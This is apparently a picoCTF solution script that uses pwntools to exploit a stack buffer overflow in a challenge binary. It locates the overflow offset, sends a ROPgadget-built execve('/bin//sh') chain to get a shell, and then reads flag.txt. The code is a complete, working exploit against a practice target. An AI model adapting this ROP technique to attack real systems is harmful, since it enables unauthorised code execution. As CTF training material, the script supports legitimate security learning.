#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 56380 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 56380)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def get_overflow_offset():
    proc = process(exe.path)
    payload = cyclic(100, n=exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n=exe.bytes)
    log.info("Overflow offset: %i", offset)
    return offset

def get_rop(overflow_offset):
    # execve generated by ROPgadget
    # ROPgadget --binary ./vuln --rop --badbytes "0a"
    from struct import pack

    p = b""

    p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
    p += pack('<I', 0x080e5060) # @ .data
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x080b074a) # pop eax ; ret
    p += b'/bin'
    p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
    p += pack('<I', 0x080e5064) # @ .data + 4
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x080b074a) # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
    p += pack('<I', 0x080e5068) # @ .data + 8
    p += pack('<I', 0x41414141) # padding
    p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
    p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x08049022) # pop ebx ; ret
    p += pack('<I', 0x080e5060) # @ .data
    p += pack('<I', 0x08049e39) # pop ecx ; ret
    p += pack('<I', 0x080e5068) # @ .data + 8
    p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
    p += pack('<I', 0x080e5068) # @ .data + 8
    p += pack('<I', 0x080e5060) # padding without overwrite ebx
    p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0808055e) # inc eax ; ret
    p += pack('<I', 0x0804a3d2) # int 0x80

    return fit({overflow_offset: p})

def send_payload(proc, payload):
    proc.sendlineafter(b"How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!", payload)

overflow_offset = get_overflow_offset()

io = start()
payload = get_rop(overflow_offset)

log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

io.sendline(b"cat flag.txt")

output = io.recvuntil(b"}")

flag = re.search("picoCTF{.*?}", output.decode("ascii")).group()
log.success("Flag %s", flag)
